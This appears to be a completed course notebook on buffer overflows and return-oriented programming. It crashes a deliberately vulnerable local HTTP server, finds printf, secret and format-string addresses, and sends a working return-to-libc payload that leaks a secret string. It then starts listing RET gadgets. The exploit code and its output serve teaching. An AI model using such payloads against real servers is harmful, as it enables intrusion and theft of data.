# %% [markdown]
# # Exercise 2: Buffer Overflow and Return-Oriented Programming (ROP) Attacks
#
# ### Assignment Deadline: Feb 14th (Friday) before 11:59PM

# %% [markdown]
# **This assignment is worth 15% of the semester grade.**
#
# **The latter part of the assignment may be challenging. If you cannot finish the whole exercise, you can still obtain partial points on the part finished.**

# %% [markdown]
# Before you start, run the following cell to install some dependencies. In this project, we mainly need three Python modules:
#
# *   `python-ptrace`: Tracing processes and retrieve process states
# *   `lief`: ELF binary reader and transformer
# *   `capstone`: amazing x86 disassembler

# %%
# !pip install python-ptrace lief capstone
# Out:
# Collecting python-ptrace
#   Downloading python_ptrace-0.9.9-py2.py3-none-any.whl.metadata (1.5 kB)
# Collecting lief
#   Downloading lief-0.16.4-cp311-cp311-manylinux_2_28_x86_64.whl.metadata (2.5 kB)
# Collecting capstone
#   Downloading capstone-5.0.5-py3-none-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.3 kB)
# Downloading python_ptrace-0.9.9-py2.py3-none-any.whl (104 kB)
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 104.8/104.8 kB 2.9 MB/s eta 0:00:00
# Downloading lief-0.16.4-cp311-cp311-manylinux_2_28_x86_64.whl (3.0 MB)
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.0/3.0 MB 20.4 MB/s eta 0:00:00
# Downloading capstone-5.0.5-py3-none-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.5 MB)
#    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.5/1.5 MB 28.7 MB/s eta 0:00:00
# Installing collected packages: python-ptrace, lief, capstone
# Successfully installed capstone-5.0.5 lief-0.16.4 python-ptrace-0.9.9

# %% [markdown]
# ## Step 1: Buffer Overflow

# %% [markdown]
# Now, we will download and unzip the binary sample of a HTTP server vulnerable to ROP attack. You may also download the sample from the given Google Drive link and analyze yourself on your own computer if you want. Running the server on your computer will not damage your computer.

# %%
# !wget -O server-sample.zip https://github.com/chiache/csce713-assignments/raw/master/lab2/server-sample.zip
# !unzip -o server-sample.zip
# Out:
# --2025-03-06 05:51:22--  https://github.com/chiache/csce713-assignments/raw/master/lab2/server-sample.zip
# Resolving github.com (github.com)... 20.27.177.113
# Connecting to github.com (github.com)|20.27.177.113|:443... connected.
# HTTP request sent, awaiting response... 302 Found
# Location: https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab2/server-sample.zip [following]
# --2025-03-06 05:51:23--  https://raw.githubusercontent.com/chiache/csce713-assignments/master/lab2/server-sample.zip
# Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
# Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 435193 (425K) [application/zip]
# Saving to: ‘server-sample.zip’
#
# server-sample.zip   100%[===================>] 424.99K  2.42MB/s    in 0.2s
#
# 2025-03-06 05:51:24 (2.42 MB/s) - ‘server-sample.zip’ saved [435193/435193]
#
# Archive:  server-sample.zip
#    creating: public/
#    creating: public/img/
#  extracting: public/img/.gitignore
#    creating: public/js/
#  extracting: public/js/main.js
#   inflating: public/js/plugins.js
#    creating: public/js/vendor/
#   inflating: public/js/vendor/modernizr-3.11.2.min.js
#   inflating: public/site.webmanifest
#   inflating: public/index.html
#   inflating: public/icon.png
#   inflating: public/browserconfig.xml
#   inflating: public/robots.txt
#   inflating: public/tile.png
#    creating: public/css/
#   inflating: public/css/main.css
#   inflating: public/css/normalize.css
#   inflating: public/humans.txt
#    creating: public/doc/
#   inflating: public/doc/js.md
#   inflating: public/doc/TOC.md
#   inflating: public/doc/html.md
#   inflating: public/doc/misc.md
#   inflating: public/doc/faq.md
#   inflating: public/doc/extend.md
#   inflating: public/doc/usage.md
#   inflating: public/doc/css.md
#   inflating: public/favicon.ico
#   inflating: public/404.html
#   inflating: public/LICENSE.txt
#   inflating: public/tile-wide.png
#   inflating: server
#   inflating: secret.txt

# %% [markdown]
# Next, let's run the HTTP server as a background process.

# %%
# !killall -9 -q server

import subprocess
import time

p = subprocess.Popen('./server', shell=False, stderr=subprocess.PIPE, universal_newlines=True)

# Wait for server to start
while True:
  if "Server started" in p.stderr.readline(): break

time.sleep(1)

# %% [markdown]
# Once the HTTP server is up and running, try the following cell to retrieve the index page of the website. If the server works, you should be able to see the "**Hello World**" message from the index page.

# %%
import requests
from IPython.core.display import display, HTML

r = requests.get('http://127.0.0.1:8000', stream=True)
display(HTML(r.text))
# Out:
# <!doctype html>
# <html class="no-js" lang="">
#
# <head>
#   <meta charset="utf-8">
#   <title>Simple HTTP server</title>
#   <meta name="description" content="This is a very simple HTTP server for Unix, using fork(). It's very easy to use.">
#   <meta name="viewport" content="width=device-width, initial-scale=1">
#
#   <link rel="manifest" href="site.webmanifest">
#   <link rel="apple-touch-icon" href="icon.png">
#   <!-- Place favicon.ico in the root directory -->
#
#   <link rel="stylesheet" href="css/normalize.css">
#   <link rel="stylesheet" href="css/main.css">
#
#   <meta name="theme-color" content="#fafafa">
# </head>
#
# <body>
#   <h1>Hello world!</h1>
#   <p>This is a very simple HTTP server for Unix, using fork(). It's very easy to use.</p>
#
#   <script src="js/vendor/modernizr-3.11.2.min.js"></script>
#   <script src="js/plugins.js"></script>
#   <script src="js/main.js"></script>
# </body>
#
# </html>

# %% [markdown]
# Next, modify the following cell to access different URLs inside the server and find the condition that will crash the server. **Hint: You can start with an extremely long URL to test the server.**
#
# You can keep retry even if you accidentially crash the server. The server utilizes multiple processes so even if you crash one process with a URL, the server can continue to run.

# %%
import requests
from IPython.core.display import display, HTML

# TODO: Manipulate the following command to crash the server
url = 'http://127.0.0.1:8000/'
url = url + 153 * 'a'
r = requests.get(url, stream=True)
display(HTML(r.text))
# Out:
# <!doctype html>
# <html lang="en">
#
# <head>
#   <meta charset="utf-8">
#   <title>Page Not Found</title>
#   <meta name="viewport" content="width=device-width, initial-scale=1">
#   <style>
#     * {
#       line-height: 1.2;
#       margin: 0;
#     }
#
#     html {
#       color: #888;
#       display: table;
#       font-family: sans-serif;
#       height: 100%;
#       text-align: center;
#       width: 100%;
#     }
#
#     body {
#       display: table-cell;
#       vertical-align: middle;
#       margin: 2em auto;
#     }
#
#     h1 {
#       color: #555;
#       font-size: 2em;
#       font-weight: 400;
#     }
#
#     p {
#       margin: 0 auto;
#       width: 280px;
#     }
#
#     @media only screen and (max-width: 280px) {
#
#       body,
#       p {
#         width: 95%;
#       }
#
#       h1 {
#         font-size: 1.5em;
#         margin: 0 0 0.3em;
#       }
#
#     }
#   </style>
# </head>
#
# <body>
#   <h1>Page Not Found</h1>
#   <p>Sorry, but the page you were trying to view does not exist.</p>
# </body>
#
# </html>
# <!-- IE needs 512+ bytes: https://docs.microsoft.com/archive/blogs/ieinternals/friendly-http-error-pages -->

# %% [markdown]
# According to your experiment, what is the crashing condition of the server? Please write down your answer in the following cell.

# %% [markdown]
# Your answer: I did binary search to find out actual number of string to add to crash the server using buffer overflow from logn url. At first I started with 100 'a' character then 1000, then 500, can to know that I need actually 154 character to crash the server.

# %% [markdown]
# Once you are done, you can terminate the server using the following cell.

# %%
# !killall -9 -q server

# %% [markdown]
# ## Step 2: Return-to-libc attack

# %% [markdown]
# In this step, you will perform a return-to-libc attack to print out extra information from the server. A return-to-libc attack is an attack based on stack smashing, which will overwrite the stack return address to jump to a known libc function, such as `system()` or `printf()`. Normally, there are many challenges which will make this attack difficult. For example, the **address space layout randomization (ASLR)** will load the libc libray into random address inside the application process, making it challenging to determine what address to inject into the stack. Further, without direct access to the process state, the attacker needs to make a lot of guesses and assemptions to figure out how to attack.
#
# To make the attack easier, we made several changes to the target program:
#
# 1.   The target program (`server`) is statically compiled with the libc code included, and the binary is loaded at a fixed place so it will not be affected by Address Space Layout Randomization (ASLR). The only part that is subject to ASLR is the stack.
# 2.   The target program (`server`) is compiled as a 32-bit program on a 64-bit platform, so that each address in the program is 32-bit instead of 64-bit. This largely reduce the difficulty of injecting specific addresses into the stack. Further, the program is compiled with the `-fomit-frame-pointer` option, meaning that the frame pointer (`ebp`) is not injected into the frame by default.
# 3.   The target program (`server`) will be run under a ptrace program, which will monitor the timing that the program receives a segmentation fault, and will print out the register values and the stacks in the faulting process. This will allow you to peek into the program when it's under the attack.

# %% [markdown]
# The goal of this step is to perform a return-to-libc attack to print out a specific **secret** inside the program.

# %% [markdown]
# ### Step 2.1. Where's the return address?

# %% [markdown]
# Let's first take a closer look at the stack to see how the buffer overflow attack overwrites the return address. We will use the following ptrace debugger to run the server sample, so that we can capture the segmentation fault and print the registers and stack when the fault happens. Run the following cell and change the second cell to trigger the crashing condition you found in the previous step.

# %%
import ptrace.debugger
from ptrace.debugger import NewProcessEvent, ProcessSignal
from resource import getpagesize
from logging import info
import signal

PGSIZE = getpagesize()

def trace_segfault(pid):
  debugger = ptrace.debugger.PtraceDebugger()
  debugger.traceFork()
  process = debugger.addProcess(pid, False)
  print("Continue process execution")
  process.cont()
  print("Wait next process event...")
  while True:
      event = debugger.waitProcessEvent()
      p = event.process
      if isinstance(event, NewProcessEvent):
        print("New process created: pid = %d" % p.pid)
        p.cont()
      elif isinstance(event, ProcessSignal):
        print("%s in process %d" % (signal.strsignal(event.signum), p.pid))
        print("EIP: %08x" % p.getreg("rip"))
        print("ESP: %08x" % p.getreg("rsp"))
        print("EBP: %08x" % p.getreg("rbp"))
        print("EAX: %08x" % p.getreg("rax"))
        print("EBX: %08x" % p.getreg("rbx"))
        print("ECX: %08x" % p.getreg("rcx"))
        print("EDX: %08x" % p.getreg("rdx"))
        print("Stack (high to low):")
        sp = p.getStackPointer()
        for va in range(sp + 24, sp - 40, -8):
            try:
                value = p.readWord(va)
                if va == sp: mark = " <- ESP"
                else: mark = ""
                print("%08x: %08x"   % (va + 4, value >> 32))
                print("%08x: %08x%s" % (va,     value & 0xFFFFFFFF, mark))
            except:
                pass
        break
  debugger.quit()

# %%
# !killall -9 -q server

import subprocess
import multiprocessing
import time
import socket
from IPython.core.display import display, HTML

def trace_server():
  p = subprocess.Popen('./server', shell=False, stderr=subprocess.PIPE, universal_newlines=True)

  # Wait for server to start
  while True:
    if "Server started" in p.stderr.readline(): break

  trace_segfault(p.pid)

proc = multiprocessing.Process(target=trace_server)
proc.start()

time.sleep(1)

# TODO: Manipulate the following command to crash the server
try:
  url = 'http://127.0.0.1:8000/'
  url += 154 * 'a'
  #url += "\x40\x2a\x05\x08"
  #url += "\x3a\xac\x04\x08"
  #url += "\x45\xf0\x0c\x08"
  #url += "\xe0\x94\x10\x08"
  r = requests.get(url, stream=True)
  display(HTML(r.text))
except:
  pass

# Kill the server
proc.terminate()
proc.join()
# Out:
# Continue process execution
# Wait next process event...
# New process created: pid = 2592
# Segmentation fault in process 2592
# EIP: 0804ab9a
# ESP: ffeabb10
# EBP: ffeabba8
# EAX: 00000000
# EBX: 61616161
# ECX: 0970dd4f
# EDX: 00000000
# Stack (high to low):
# ffeabb2c: 08107168
# ffeabb28: 0970e693
# ffeabb24: 00000131
# ffeabb20: 0970e687
# ffeabb1c: 00000000
# ffeabb18: 00000000
# ffeabb14: 00000004
# ffeabb10: 00000001 <- ESP
# ffeabb0c: 0804ac00
# ffeabb08: 61616161
# ffeabb04: 61616161
# ffeabb00: 61616161
# ffeabafc: 61616161
# ffeabaf8: 61616161
# ffeabaf4: 61616161
# ffeabaf0: 61616161
# WARNING:root:Terminate <PtraceProcess #2592>

# %% [markdown]
# If you set the crashing condition correctly, you shall be able to overwrite just one byte of the return address, so that you can still see the rest of the return address. Next, we can search for the code inside the binary, to find out where the exact return address shall be. The key in this step is that the return address should be the **next** instruction of a `CALL` instruction.
#
# We will use `lief` to read the ELF binary, and use `capstone` to disassmble the code to find the exact return address. You can find their documentations as follows:
#
# * `lief`: https://lief-project.github.io/doc/latest/
# * `capstone`: https://www.capstone-engine.org/lang_python.html

# %%
import lief
from capstone import *
import os

# Parse the ELF binary
binary = lief.parse("server")

code_section = binary.get_section('.text')
code_start = code_section.virtual_address
code_end = code_start + code_section.size
print("Code section: %08x - %08x" % (code_start, code_end))

# Read the code
fd = os.open('server', os.O_RDONLY)
code = os.pread(fd, code_section.size, code_section.file_offset)

# Parse the instruction within a specific range
search_range = (0x0804ac00, 0x0804acff) # Using this range because when we first encounter server crash beacuse of stack overflow, we can notice that only last byte is 00 (set by our buffer overflow) of 0804ac00, so we can narrow our search region from 0804ac00 to 0804acff

md = Cs(CS_ARCH_X86, CS_MODE_32)
for insn in md.disasm(code[search_range[0]-code_start:search_range[1]-code_start], search_range[0]):
  print("0x%x:\t%s\t%s" %(insn.address, insn.mnemonic, insn.op_str))
# Out:
# Code section: 08049150 - 080cd6e1
# 0x804ac00:	loopne	0x804ab9a
# 0x804ac02:	adc	byte ptr [eax], cl
# 0x804ac04:	mov	eax, dword ptr [eax]
# 0x804ac06:	mov	edx, dword ptr [esp + 0x30]
# 0x804ac0a:	shl	edx, 2
# 0x804ac0d:	add	eax, edx
# 0x804ac0f:	mov	eax, dword ptr [eax]
# 0x804ac11:	mov	dword ptr [esp + 4], eax
# 0x804ac15:	sub	esp, 8
# 0x804ac18:	push	1
# 0x804ac1a:	push	dword ptr [esp + 0x10]
# 0x804ac1e:	call	0x807cfd0
# 0x804ac23:	add	esp, 0x10
# 0x804ac26:	sub	esp, 0xc
# 0x804ac29:	push	dword ptr [esp + 0x10]
# 0x804ac2d:	call	0x807cf10
# 0x804ac32:	add	esp, 0x10
# 0x804ac35:	call	0x8049fff
# 0x804ac3a:	mov	eax, 0x8107590
# 0x804ac40:	mov	eax, dword ptr [eax]
# 0x804ac42:	sub	esp, 0xc
# 0x804ac45:	push	eax
# 0x804ac46:	call	0x8059c10
# 0x804ac4b:	add	esp, 0x10
# 0x804ac4e:	sub	esp, 8
# 0x804ac51:	push	1
# 0x804ac53:	push	1
# 0x804ac55:	call	0x807f540
# 0x804ac5a:	add	esp, 0x10
# 0x804ac5d:	sub	esp, 0xc
# 0x804ac60:	push	1
# 0x804ac62:	call	0x807cf10
# 0x804ac67:	add	esp, 0x10
# 0x804ac6a:	mov	eax, dword ptr [ebx + 0x1520]
# 0x804ac70:	sub	esp, 0xc
# 0x804ac73:	push	eax
# 0x804ac74:	call	0x80675f0
# 0x804ac79:	add	esp, 0x10
# 0x804ac7c:	nop
# 0x804ac7d:	add	esp, 0x28
# 0x804ac80:	pop	ebx
# 0x804ac81:	ret
# 0x804ac82:	nop
# 0x804ac84:	nop
# 0x804ac86:	nop
# 0x804ac88:	nop
# 0x804ac8a:	nop
# 0x804ac8c:	nop
# 0x804ac8e:	nop
# 0x804ac90:	push	ebp
# 0x804ac91:	push	edi
# 0x804ac92:	push	esi
# 0x804ac93:	call	0x804b80f
# 0x804ac98:	add	esi, 0xbc368
# 0x804ac9e:	push	ebx
# 0x804ac9f:	sub	esp, 0x104
# 0x804aca5:	mov	dword ptr [esp], ecx
# 0x804aca8:	test	eax, eax
# 0x804acaa:	je	0x804ae57
# 0x804acb0:	xor	ebx, ebx
# 0x804acb2:	mov	edi, eax
# 0x804acb4:	mov	ebp, edx
# 0x804acb6:	mov	eax, 1
# 0x804acbb:	mov	ecx, ebx
# 0x804acbd:	cpuid
# 0x804acbf:	mov	esi, 0x8108b80
# 0x804acc5:	mov	dword ptr [esi + 0xc], edx
# 0x804acc8:	mov	edx, eax
# 0x804acca:	shr	edx, 8
# 0x804accd:	mov	dword ptr [esi + 4], ebx
# 0x804acd0:	mov	ebx, dword ptr [esp]
# 0x804acd3:	and	edx, 0xf
# 0x804acd6:	mov	dword ptr [esi + 8], ecx
# 0x804acd9:	mov	ecx, eax
# 0x804acdb:	mov	dword ptr [esi], eax
# 0x804acdd:	and	ecx, 0xf
# 0x804ace0:	mov	dword ptr [edi], edx
# 0x804ace2:	mov	edx, eax
# 0x804ace4:	shr	edx, 4
# 0x804ace7:	and	edx, 0xf
# 0x804acea:	mov	dword ptr [ebp], edx
# 0x804aced:	mov	edx, eax
# 0x804acef:	shr	edx, 0xc
# 0x804acf2:	and	edx, 0xf0
# 0x804acf8:	mov	dword ptr [ebx], edx

# %% [markdown]
# Based on what you found, what are the possible return addresses of the attacked function? Write your answer down in the next cell. There can be multiple possible answers.

# %% [markdown]
# Your answer: 804ac23, 804ac32, 804ac3a, 804ac4b, 804ac5a, 804ac67, 804ac79, 804ac98 are the possible return adress after function calls.

# %% [markdown]
# ### Step 2.2. Find the target symbols

# %% [markdown]
# Next, we need to determine the target address we want to inject inside the program. Recall that, to call `printf()` correctly, you need a stack frame that looks as the following:
#
# ```
# ESP + 24 +------------------+
#          |  arguments[N-1]  |
# ESP + 20 +------------------+
#          |      . . .       |
# ESP + 16 +------------------+
#          |   arguments[1]   |
# ESP + 12 +------------------+
#          |   arguments[0]   |
# ESP +  8 +------------------+
#          |   format string  |
# ESP +  4 +------------------+
#          |    return addr   |
# ESP +  0 +------------------+
# ```
# The `ESP` here will be the stack pointer immediately after the function ends with the `RET` instruction and jumps to the function address you injected into the stack. You will need a format string to contain the proper parameters, such as `%s`, to print out the values that are pointed to by the arguments immediately above the format string. This means that you need at least four pieces of information:
#
#
# 1. The original return address to exit gracefully.
# 2. A pointer to a string that contains `%s`. Due to ASLR, you cannot directly use any string on the stack or on the heap, so your only hope is the data section of the binary.
# 3. A pointer to the variable you want to reveal from the program.
# 4. The address of `printf`.
#
# We already figured out the first one in the last step, so let's modify the next cell to find out the other three pieces of information:

# %%
import lief

binary = lief.parse("server")

# TODO: Find out the address of printf (Hint: Use lief API)
printf_addr = binary.get_symbol("printf").value
print("Address of printf = %08x" % (printf_addr))

# TODO: Find out the address of secret (Hint: Use lief API)
secret_addr = binary.get_symbol("secret").value
print("Address of secret = %08x" % (secret_addr))

data_section = binary.get_section('.rodata')
data_start = data_section.virtual_address
data_end = data_start + data_section.size
print("(RO) Data section: %08x - %08x" % (data_start, data_end))

fd = os.open('server', os.O_RDONLY)
data = os.pread(fd, data_section.size, data_section.file_offset)

# TODO: Search for '%s' in the data and add the ponters into a list
format_strings = []
needle = b"%s"
index = 0
while True:
    index = data.find(needle, index)
    if index == -1:
        break
    # Compute the in-memory address of the found string
    pointer_addr = data_start + index
    format_strings.append(pointer_addr)
    index += 1  # move index forward to search for further occurrences

def find_null_terminated_str(x, start):
  s = ''
  for i in range(len(x)):
    if x[start+i] == 0:
      break
    s += chr(x[start+i])
  return s.encode('unicode_escape')

print("Possible format strings:")
for str_addr in format_strings:
  print("%08x: %s" % (str_addr, find_null_terminated_str(data, str_addr - data_start)))
# Out:
# Address of printf = 08052a40
# Address of secret = 081094e0
# (RO) Data section: 080cf000 - 080eb7f4
# Possible format strings:
# 080cf037: b'%s%s'
# 080cf039: b'%s'
# 080cf045: b'%s 200 OK\\n\\n'
# 080cf071: b'%s\\n\\n'
# 080cf096: b'%s: %s\\n'
# 080cf09a: b'%s\\n'
# 080cf0a3: b'%s 201 Created\\n\\n'
# 080cf113: b'%s'
# 080cf116: b'%s 404 Not found\\n\\n'
# 080cf134: b'%s 500 Internal Server Error\\n\\n'
# 080cf173: b'%shttp://127.0.0.1:%s%s\\n'
# 080cf186: b'%s%s\\n'
# 080cf188: b'%s\\n'
# 080cf214: b'%s] %s\\x1b\\n'
# 080cf218: b'%s\\x1b\\n'
# 080cf22d: b'%s: %s\\n'
# 080cf231: b'%s\\n'
# 080cf444: b"%s%s%s:%u: %s%sAssertion `%s' failed.\\n%n"
# 080cf446: b"%s%s:%u: %s%sAssertion `%s' failed.\\n%n"
# 080cf448: b"%s:%u: %s%sAssertion `%s' failed.\\n%n"
# 080cf44f: b"%s%sAssertion `%s' failed.\\n%n"
# 080cf451: b"%sAssertion `%s' failed.\\n%n"
# 080cf45e: b"%s' failed.\\n%n"
# 080cf4cc: b'%s/%s'
# 080cf4cf: b'%s'
# 080d0378: b"%s%s%s:%u: %s%sAssertion `%s' failed.\\n"
# 080d037a: b"%s%s:%u: %s%sAssertion `%s' failed.\\n"
# 080d037c: b"%s:%u: %s%sAssertion `%s' failed.\\n"
# 080d0383: b"%s%sAssertion `%s' failed.\\n"
# 080d0385: b"%sAssertion `%s' failed.\\n"
# 080d0392: b"%s' failed.\\n"
# 080d2879: b'%s ***: terminated\\n'
# 080d2a0c: b'%s: line %d: cannot specify more than %d trim domains'
# 080d2a44: b'%s: line %d: list delimiter not followed by domain'
# 080d2a78: b"%s: line %d: expected `on' or `off', found `%s'\\n"
# 080d2aa4: b"%s'\\n"
# 080d2aac: b"%s: line %d: ignoring trailing garbage `%s'\\n"
# 080d2ad4: b"%s'\\n"
# 080d2adc: b"%s: line %d: bad command `%s'\\n"
# 080d2af6: b"%s'\\n"
# 080d2ec8: b'%s.so.%d.%d'
# 080d3beb: b'%s: %s: %s%s%s%s%s\\n'
# 080d3bef: b'%s: %s%s%s%s%s\\n'
# 080d3bf3: b'%s%s%s%s%s\\n'
# 080d3bf5: b'%s%s%s%s\\n'
# 080d3bf7: b'%s%s%s\\n'
# 080d3bf9: b'%s%s\\n'
# 080d3bfb: b'%s\\n'
# 080e430e: b'%s%s%s: %s'
# 080e4310: b'%s%s: %s'
# 080e4312: b'%s: %s'
# 080e4316: b'%s'
# 080e4748: b'%s'
# 080e476b: b'%s from file %s)\\n'
# 080e4778: b'%s)\\n'
# 080e4780: b'%s)\\n'
# 080e4793: b'%s\\n'
# 080e4bb1: b'%s [%lu];  generating link map\\n'
# 080e4d36: b'%s [%lu];  needed by %s [%lu]\\n'
# 080e4d4b: b'%s [%lu]\\n'
# 080e4d5e: b'%s [%lu];  dynamically loaded by %s [%lu]\\n'
# 080e4d7f: b'%s [%lu]\\n'
# 080e4d99: b'%s [%lu]; searching\\n'
# 080e4f22: b'%s%s%s'
# 080e4f24: b'%s%s'
# 080e4f26: b'%s'
# 080e4f3f: b'%s]\\n'
# 080e4f97: b'%s;  lookup in file=%s [%lu]\\n'
# 080e4fab: b'%s [%lu]\\n'
# 080e4fc0: b'%s [%lu] as NODELETE due to unique symbol\\n'
# 080e502c: b'%s [%lu] as NODELETE due to reference to main program\\n'
# 080e506c: b'%s [%lu] as NODELETE due to reference to %s [%lu]\\n'
# 080e5095: b'%s [%lu]\\n'
# 080e50a6: b'%s [%lu];  needed by %s [%lu] (relocation dependency)\\n\\n'
# 080e50bb: b'%s [%lu] (relocation dependency)\\n\\n'
# 080e50ed: b"%s [%lu] to %s [%lu]: %s symbol `%s'"
# 080e50f9: b"%s [%lu]: %s symbol `%s'"
# 080e5103: b"%s symbol `%s'"
# 080e510e: b"%s'"
# 080e511c: b'%s [%lu] as NODELETE due to memory allocation failure\\n'
# 080e5234: b"%s: Relink `%s' with `%s' for IFUNC symbol `%s'\\n"
# 080e5240: b"%s' with `%s' for IFUNC symbol `%s'\\n"
# 080e524a: b"%s' for IFUNC symbol `%s'\\n"
# 080e5260: b"%s'\\n"
# 080e5298: b"%s: Symbol `%s' has different size in shared object, consider re-linking\\n"
# 080e52a4: b"%s' has different size in shared object, consider re-linking\\n"
# 080e52e4: b'%s: out of memory to store relocation results for %s\\n'
# 080e5316: b'%s\\n'
# 080e5355: b'%s%s\\n'
# 080e5357: b'%s\\n'
# 080e5ab8: b'%s: cannot open file: %s\\n'
# 080e5ace: b'%s\\n'
# 080e5ad2: b'%s: cannot stat file: %s\\n'
# 080e5ae8: b'%s\\n'
# 080e5aec: b'%s: cannot create file: %s\\n'
# 080e5b04: b'%s\\n'
# 080e5b08: b'%s: cannot map file: %s\\n'
# 080e5b1d: b'%s\\n'
# 080e5b24: b"%s: file is no correct profile data file for `%s'\\n"
# 080e5b52: b"%s'\\n"
# 080e5dff: b'%s [%lu]\\n'
# 080e5e8a: b'%s [%lu] as NODELETE\\n'
# 080e5ecd: b'%s [%lu] to global scope\\n'
# 080e5fb5: b'%s [%lu]; direct_opencount=%u\\n\\n'
# 080e6030: b'%s [%lu]\\n'
# 080e614e: b'%s [%lu]\\n\\n'
# 080e61ca: b'%s; direct_opencount=%u\\n'
# 080e627a: b'%s [%lu];  destroying link map\\n'
# 080e63dd: b'%s\\n'
# 080e6ac4: b'%s %h %e %r%N%C-%z %T%N%c%N'
# 080eae17: b"%s' because of empty dynamic string token substitution\\n"
# 080eae8e: b'%s requested by file=%s\\n'
# 080eaea3: b'%s\\n'
# 080eafe9: b'%s\\n\\n'
# 080eb000: b'%s\\n\\n'
# 080eb05c: b'%s of Verneed record'
# 080eb08a: b"%s' in file %s [%lu] required by file %s [%lu]\\n"
# 080eb096: b'%s [%lu] required by file %s [%lu]\\n'
# 080eb0b0: b'%s [%lu]\\n'
# 080eb0ea: b'%s)'
# 080eb104: b'%s of Verdef record'
# 080eb126: b"%s' not found (required by %s)"
# 080eb141: b'%s)'
# 080eb151: b"%s' not found (required by %s)"
# 080eb16c: b'%s)'

# %% [markdown]
# ### Step 2.3: Let's do the attack!

# %% [markdown]
# Now, let's run the `server` program and simultaneously send HTTP GET request(s) to test the program. Once you can successfully trigger a segmentation fault, watch the dumped stack to figure out what's being injected into the stack.
#
# One thing you have to be aware is that the `requests` module of Python automatically encodes the HTTP requests as Unicode. As a result, if you try to put specific bytes into the requested URL, they may be transformed into different values and therefore you cannot inject the exact the value you want. The solution to that is to send the raw HTTP requests to the server using a TCP socket.  You still need to encode the other parts of the HTTP requests but can encode extra charaters in the middle to inject the values you want into the server stack. The following cell will use sockets instead of the Python `requests` module to issue the HTTP requests.

# %%
# !killall -9 -q server

import subprocess
import multiprocessing
import time
import socket
from IPython.core.display import display, HTML

def trace_server():
  p = subprocess.Popen('./server', shell=False, stderr=subprocess.PIPE, universal_newlines=True)

  # Wait for server to start
  while True:
    if "Server started" in p.stderr.readline(): break

  trace_segfault(p.pid)

proc = multiprocessing.Process(target=trace_server)
proc.start()

time.sleep(1)

# Let's use socket instead of requests
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 8000))

# TODO: Manipulate the following command to crash the server
#attack_url = 154 * 'a' + "\x08\x04\xac\x00\x08\x05\x2a\x40\x08\x10\x94\xe0"

attack_stack = [
  0x40, 0x2a, 0x05, 0x08, # Address of printf = 08052a40
  0x3a, 0xac, 0x04, 0x08, # Orinigal return Address: 804ac3a. However 804ac32 also worked for me.
  0x45, 0xf0, 0x0c, 0x08, # 080cf045: b'%s 200 OK\\n\\n'
  0xe0, 0x94, 0x10, 0x08, # Address of secret = 081094e0
]

req = ("GET /" + 'a'*154).encode() + bytearray(attack_stack) + " HTTP/1.1\r\nConnection: close\r\n\r\n".encode()
#print(req)
client_socket.sendall(req)

# Wait for the response and display it
r = client_socket.recv(4096)
#print(r)
client_socket.close()
display(HTML(r.decode()))

# Kill the server
proc.terminate()
proc.join()
# Out:
# Continue process execution
# Wait next process event...
# New process created: pid = 3127
# Segmentation fault in process 3127
# HTTP/1.1 404 Not found
#
# <!doctype html>
# <html lang="en">
#
# <head>
#   <meta charset="utf-8">
#   <title>Page Not Found</title>
#   <meta name="viewport" content="width=device-width, initial-scale=1">
#   <style>
#     * {
#       line-height: 1.2;
#       margin: 0;
#     }
#
#     html {
#       color: #888;
#       display: table;
#       font-family: sans-serif;
#       height: 100%;
#       text-align: center;
#       width: 100%;
#     }
#
#     body {
#       display: table-cell;
#       vertical-align: middle;
#       margin: 2em auto;
#     }
#
#     h1 {
#       color: #555;
#       font-size: 2em;
#       font-weight: 400;
#     }
#
#     p {
#       margin: 0 auto;
#       width: 280px;
#     }
#
#     @media only screen and (max-width: 280px) {
#
#       body,
#       p {
#         width: 95%;
#       }
#
#       h1 {
#         font-size: 1.5em;
#         margin: 0 0 0.3em;
#       }
#
#     }
#   </style>
# </head>
#
# <body>
#   <h1>Page Not Found</h1>
#   <p>Sorry, but the page you were trying to view does not exist.</p>
# </body>
#
# </html>
# <!-- IE needs 512+ bytes: https://docs.microsoft.com/archive/blogs/ieinternals/friendly-http-error-pages -->
# To be, or not to be, that is the question.
#  200 OK

# %% [markdown]
# ## Step 3: Finding ROP Gadgets

# %% [markdown]
# In next step, we will try to locate some ROP gadget for future attacks. Remember that we have discussed in the class that a ROP gadget is a piece of instruction from the original code section (the `.text` segment) of the program binary, which can be reused to construct the logic that the attacker intends to perform. Each ROP gadget must be ended with a `RET` instruction, so that we can chain it with another ROP gadget through injecting the address into the stack.

# %% [markdown]
# First, we will scan the binary to look for `RET` instruction. You can either use the capstone dissembler, or directly search for the hexadecimal value that `RET` is encoded to (`0xc3`). Finish the following cell to list all the locations in the code section that can be intepretted as `RET` (even if the original instruction is not `RET`).

# %%
import lief
from capstone import *
import os

binary = lief.parse("server")

code_section = binary.get_section('.text')
code_start = binary.imagebase + code_section.offset
code_end = code_start + code_section.size

fd = os.open('server', os.O_RDONLY)
code = os.pread(fd, code_section.size, code_section.file_offset)

md = Cs(CS_ARCH_X86, CS_MODE_32)
insn = next(md.disasm(code, code_start))
print("First instruction:")
print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
print()

# TODO: find all the RET instructions and put them into a list
ret_insns = []
for i in range(len(code)):
  if code[i] == 0xc3:
    ret_insns.append(next(md.disasm(code[i:i+1], code_start+i)))

# Do not change the code below
print("Print all the RET instructions:")
for insn in ret_insns:
  assert insn.mnemonic == 'ret'
  print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# First instruction:
# 08049150:	sub	esp, 0xc
#
# Print all the RET instructions:
# 08049647:	ret
# 080498ca:	ret
# 08049b63:	ret
# 08049b6f:	ret
# 08049ca5:	ret
# 08049cca:	ret
# 08049cd4:	ret
# 08049ce3:	ret
# 08049d16:	ret
